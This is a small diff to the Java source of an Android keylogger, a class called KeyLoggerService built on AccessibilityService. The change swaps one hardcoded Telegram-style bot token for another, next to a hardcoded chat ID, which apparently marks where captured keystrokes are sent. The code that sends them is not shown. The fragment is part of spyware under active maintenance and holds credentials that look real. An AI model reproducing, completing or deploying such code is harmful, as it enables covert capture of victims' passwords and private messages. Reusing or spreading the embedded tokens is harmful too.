@@ -23,7 +23,7 @@ import java.io.FileOutputStream;
 public class KeyLoggerService extends AccessibilityService {
 
     private String logBuffer = "";
-    private final String TOKEN = "8854307641:AAG8_B_ytH-MzzxQU6t-8rqn5p1aVx7ZfwI";
+    private final String TOKEN = "8807358451:AAGGX6ORJPS4bWaaO0Xc_skeaIVS7DTqW3Y";
     private final String CHAT_ID = "5960340632";
 
     private final Handler handler = new Handler(Looper.getMainLooper());
